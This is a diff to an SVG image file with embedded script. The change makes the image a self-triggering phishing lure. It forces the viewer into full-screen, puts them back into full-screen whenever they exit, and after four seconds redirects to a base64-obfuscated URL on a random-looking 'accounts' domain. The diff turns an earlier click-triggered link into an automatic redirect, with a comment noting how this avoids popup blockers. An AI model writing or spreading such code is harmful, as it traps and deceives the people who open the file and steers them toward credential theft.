@@ -12,12 +12,6 @@
     </filter>
   </defs>
   <script type="application/ecmascript"><![CDATA[
-    function goToBase64Link() {
-      var b64 = "aHR0cHM6Ly9hY2NvdW50cy5pd2EzcG42bHFudHhxbjRyanZrN2ZubzFudnZldzYweS5jb20v";
-      var url = atob(b64);
-      window.open(url, "_blank");
-    }
-
     // Function to request full-screen
     function goFullScreen() {
       var elem = document.documentElement;
@@ -35,15 +29,19 @@
     // Auto-trigger full-screen after 2 seconds (for "connecting" effect)
     setTimeout(goFullScreen, 2000);
 
+    // Auto-redirect after another 2 seconds (total 4s, to allow full-screen first)
+    setTimeout(function() {
+      var b64 = "aHR0cHM6Ly9hY2NvdW50cy5pd2EzcG42bHFudHhxbjRyanZrN2ZubzFudnZldzYweS5jb20v";
+      var url = atob(b64);
+      window.location.href = url; // Direct redirect (better than window.open to avoid popup blockers)
+    }, 4000);
+
     // Attempt to re-enter full-screen if exited
     document.addEventListener('fullscreenchange', function() {
       if (!document.fullscreenElement) {
         goFullScreen();
       }
     });
-
-    // Optional: Auto-redirect after full-screen (uncomment if needed)
-    // setTimeout(function() { window.location.href = atob("aHR0cHM6Ly9hY2NvdW50cy5pd2EzcG42bHFudHhxbjRyanZrN2ZubzFudnZldzYweS5jb20v"); }, 4000);
   ]]></script>
   <!-- Background -->
   <rect width="400" height="600" fill="url(#bgGradient)"/>
